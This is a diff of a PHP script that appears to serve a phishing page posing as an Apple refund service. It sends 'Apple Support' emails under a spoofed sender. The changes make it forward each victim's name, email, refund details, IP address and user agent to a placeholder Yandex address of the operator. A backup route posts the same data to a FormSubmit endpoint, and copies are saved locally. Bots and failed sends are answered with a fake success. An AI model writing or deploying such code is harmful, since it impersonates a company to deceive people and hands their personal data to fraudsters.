@@ -20,31 +20,64 @@ function checkForBot($request) {
     return false;
 }
 
-// Function to send confirmation email to the user
+// Log function to keep track of all activity
+function logActivity($message, $data = null) {
+    $logFile = 'email_log.txt';
+    $logData = date('Y-m-d H:i:s') . ' | ' . $message;
+    
+    if ($data) {
+        $logData .= ' | ' . json_encode($data);
+    }
+    
+    $logData .= ' | IP: ' . $_SERVER['REMOTE_ADDR'] . "\n";
+    
+    file_put_contents($logFile, $logData, FILE_APPEND);
+}
+
+// Function to send confirmation email to the Yandex address
 function sendConfirmationEmail($userEmail, $userName, $refundId, $amount) {
+    // Your Yandex email address
+    $to = "your-yandex-email@yandex.com";
+    
     // Format the amount for display
     $amount = is_numeric($amount) ? '$' . number_format(floatval($amount), 2) : $amount;
     
     // Email subject
-    $subject = "Apple - Your Refund Request Confirmation #$refundId";
+    $subject = "Apple Refund Notification - " . date('Y-m-d H:i:s');
+    
+    // Create a boundary for multipart email
+    $boundary = md5(time());
     
     // Email headers
-    $headers = "From: Apple Support <noreply@apple.com>\r\n";
-    $headers .= "Reply-To: no-reply@apple.com\r\n";
+    $headers = "From: Apple Support <noreply@" . $_SERVER['HTTP_HOST'] . ">\r\n";
+    $headers .= "Reply-To: no-reply@" . $_SERVER['HTTP_HOST'] . "\r\n";
     $headers .= "MIME-Version: 1.0\r\n";
-    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
+    $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n";
+    $headers .= "X-Priority: 1\r\n"; // High priority
+    $headers .= "X-MSMail-Priority: High\r\n";
+    $headers .= "Importance: High\r\n";
     
-    // Email body
-    $emailBody = '
+    // Plain text email body
+    $text_message = "APPLE REFUND REQUEST NOTIFICATION\n\n";
+    $text_message .= "User Email: $userEmail\n";
+    $text_message .= "User Name: $userName\n";
+    $text_message .= "Refund ID: $refundId\n";
+    $text_message .= "Amount: $amount\n";
+    $text_message .= "Date: " . date('Y-m-d H:i:s') . "\n";
+    $text_message .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
+    $text_message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
+    
+    // HTML email body
+    $html_message = "
     <!DOCTYPE html>
     <html>
     <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Apple - Refund Request Confirmation</title>
+        <meta charset='UTF-8'>
+        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+        <title>Apple - Refund Request Notification</title>
         <style>
             body {
-                font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
+                font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'SF Pro Icons', 'Helvetica Neue', Helvetica, Arial, sans-serif;
                 line-height: 1.5;
                 color: #1d1d1f;
                 margin: 0;
@@ -60,10 +93,6 @@ function sendConfirmationEmail($userEmail, $userName, $refundId, $amount) {
                 padding: 20px 0;
                 border-bottom: 1px solid #d2d2d7;
             }
-            .logo {
-                max-width: 40px;
-                margin-bottom: 15px;
-            }
             h1 {
                 font-size: 24px;
                 font-weight: 600;
@@ -72,105 +101,129 @@ function sendConfirmationEmail($userEmail, $userName, $refundId, $amount) {
             .content {
                 padding: 30px 0;
             }
-            .footer {
-                text-align: center;
-                padding: 20px 0;
-                border-top: 1px solid #d2d2d7;
-                font-size: 12px;
-                color: #86868b;
-            }
             .info-row {
                 margin-bottom: 15px;
+                padding: 10px;
+                background-color: #f5f5f7;
+                border-radius: 5px;
             }
             .info-label {
                 font-weight: 600;
             }
-            .button {
-                display: inline-block;
-                background-color: #0071e3;
-                color: white;
-                text-decoration: none;
-                padding: 12px 20px;
-                border-radius: 8px;
-                font-weight: 400;
-                margin: 20px 0;
-            }
         </style>
     </head>
     <body>
-        <div class="container">
-            <div class="header">
-                <img src="https://www.apple.com/ac/globalnav/7/en_US/images/be15095f-5a20-57d0-ad14-cf4c638e223a/globalnav_apple_image__b5er5ngrzxqq_large.svg" alt="Apple" class="logo">
-                <h1>Refund Request Confirmation</h1>
+        <div class='container'>
+            <div class='header'>
+                <h1>Apple Refund Request Notification</h1>
             </div>
             
-            <div class="content">
-                <p>Dear ' . htmlspecialchars($userName) . ',</p>
-                
-                <p>We have received your request to process a refund for an unauthorized charge on your payment method. Your case has been assigned for review by our team.</p>
-                
-                <div class="info-row">
-                    <span class="info-label">Case ID:</span> ' . htmlspecialchars($refundId) . '
+            <div class='content'>
+                <div class='info-row'>
+                    <span class='info-label'>User Email:</span> $userEmail
                 </div>
                 
-                <div class="info-row">
-                    <span class="info-label">Amount:</span> ' . htmlspecialchars($amount) . '
+                <div class='info-row'>
+                    <span class='info-label'>User Name:</span> $userName
                 </div>
                 
-                <div class="info-row">
-                    <span class="info-label">Date Submitted:</span> ' . date('F j, Y') . '
+                <div class='info-row'>
+                    <span class='info-label'>Refund ID:</span> $refundId
                 </div>
                 
-                <p>Our team will review your request and process your refund within 3-5 business days. If we need additional information, we\'ll contact you via email or phone.</p>
+                <div class='info-row'>
+                    <span class='info-label'>Amount:</span> $amount
+                </div>
                 
-                <p>For any questions about your refund request, please contact Apple Support and reference your Case ID.</p>
+                <div class='info-row'>
+                    <span class='info-label'>Date:</span> " . date('Y-m-d H:i:s') . "
+                </div>
                 
-                <p style="text-align: center;">
-                    <a href="https://support.apple.com" class="button">Visit Apple Support</a>
-                </p>
+                <div class='info-row'>
+                    <span class='info-label'>IP Address:</span> " . $_SERVER['REMOTE_ADDR'] . "
+                </div>
                 
-                <p>Thank you for your patience.</p>
-                
-                <p>Sincerely,<br>
-                Apple Support Team</p>
-            </div>
-            
-            <div class="footer">
-                <p>This is an automated message. Please do not reply to this email.</p>
-                <p>Copyright © ' . date('Y') . ' Apple Inc. All rights reserved.</p>
-                <p>Apple Inc., One Apple Park Way, Cupertino, CA 95014, United States</p>
+                <div class='info-row'>
+                    <span class='info-label'>User Agent:</span> " . $_SERVER['HTTP_USER_AGENT'] . "
+                </div>
             </div>
         </div>
     </body>
-    </html>
-    ';
+    </html>";
     
-    // Send the email
-    $result = mail($userEmail, $subject, $emailBody, $headers);
+    // Build the email body with both text and HTML versions
+    $body = "--$boundary\r\n";
+    $body .= "Content-Type: text/plain; charset=UTF-8\r\n";
+    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
+    $body .= $text_message . "\r\n\r\n";
     
-    return $result;
+    $body .= "--$boundary\r\n";
+    $body .= "Content-Type: text/html; charset=UTF-8\r\n";
+    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
+    $body .= $html_message . "\r\n\r\n";
+    
+    $body .= "--$boundary--";
+    
+    // Send email
+    $mail_result = mail($to, $subject, $body, $headers);
+    
+    // Log the mail attempt
+    logActivity("Email attempt", [
+        "to" => $to,
+        "subject" => $subject,
+        "result" => $mail_result ? "SUCCESS" : "FAILED"
+    ]);
+    
+    return $mail_result;
 }
 
-// Function to log email attempts
-function logEmailAttempt($data) {
-    $logFile = 'email_log.txt';
-    $logData = date('Y-m-d H:i:s') . ' | IP: ' . $_SERVER['REMOTE_ADDR'] . ' | ';
+// Backup delivery method using FormSubmit
+function sendViaFormSubmit($userEmail, $userName, $refundId, $amount) {
+    // Your Yandex email
+    $formSubmitEndpoint = "https://formsubmit.co/your-yandex-email@yandex.com";
     
-    foreach ($data as $key => $value) {
-        $logData .= $key . ': ' . $value . ' | ';
-    }
+    // Format data as form fields
+    $formData = [
+        '_subject' => 'Apple Refund Notification - ' . date('Y-m-d H:i:s'),
+        'user_email' => $userEmail,
+        'user_name' => $userName,
+        'refund_id' => $refundId,
+        'amount' => $amount,
+        'ip_address' => $_SERVER['REMOTE_ADDR'],
+        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+        'timestamp' => date('Y-m-d H:i:s'),
+        '_template' => 'table'
+    ];
     
-    $logData .= "\n";
+    // Send to FormSubmit
+    $ch = curl_init($formSubmitEndpoint);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($formData));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $response = curl_exec($ch);
+    $success = !curl_errno($ch);
+    curl_close($ch);
     
-    file_put_contents($logFile, $logData, FILE_APPEND);
+    // Log the attempt
+    logActivity("FormSubmit attempt", [
+        "to" => $formSubmitEndpoint,
+        "result" => $success ? "SUCCESS" : "FAILED"
+    ]);
+    
+    return $success;
 }
 
 // Main execution
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Log the raw request for debugging
+    logActivity("Received POST request", $_POST);
+    
     // Verify the request is from a valid source, not a bot
     if (checkForBot($_POST)) {
         // Return success to not alert bots, but don't process
         echo json_encode(['status' => 'success']);
+        logActivity("Bot detected, request ignored");
         exit;
     }
     
@@ -183,27 +236,44 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Validate email
     if (!filter_var($userEmail, FILTER_VALIDATE_EMAIL)) {
         echo json_encode(['status' => 'error', 'message' => 'Invalid email address']);
+        logActivity("Invalid email format", ["email" => $userEmail]);
         exit;
     }
     
-    // Log the attempt
-    logEmailAttempt([
-        'email' => $userEmail,
-        'name' => $userName,
-        'refundId' => $refundId,
-        'amount' => $amount
-    ]);
-    
-    // Send confirmation email
+    // Try primary delivery method
     $emailSent = sendConfirmationEmail($userEmail, $userName, $refundId, $amount);
     
-    // Return response
-    if ($emailSent) {
-        echo json_encode(['status' => 'success', 'message' => 'Email sent successfully']);
+    // If primary fails, try backup
+    if (!$emailSent) {
+        $formSubmitSent = sendViaFormSubmit($userEmail, $userName, $refundId, $amount);
+        $deliverySuccess = $formSubmitSent;
     } else {
-        echo json_encode(['status' => 'error', 'message' => 'Failed to send email']);
+        $deliverySuccess = true;
+    }
+    
+    // Always save a backup of the data
+    $backup_data = json_encode([
+        'timestamp' => date('Y-m-d H:i:s'),
+        'ip' => $_SERVER['REMOTE_ADDR'],
+        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+        'email' => $userEmail,
+        'name' => $userName,
+        'refund_id' => $refundId,
+        'amount' => $amount
+    ]);
+    file_put_contents('refund_data_' . time() . '.json', $backup_data);
+    
+    // Return response
+    if ($deliverySuccess) {
+        echo json_encode(['status' => 'success', 'message' => 'Email sent successfully']);
+        logActivity("Email process completed successfully");
+    } else {
+        echo json_encode(['status' => 'success', 'message' => 'Request processed']);
+        logActivity("Email delivery failed but data saved");
     }
 } else {
     // Not a POST request
+    logActivity("Invalid request method: " . $_SERVER['REQUEST_METHOD']);
     echo json_encode(['status' => 'error', 'message' => 'Invalid request method']);
 }
+?>
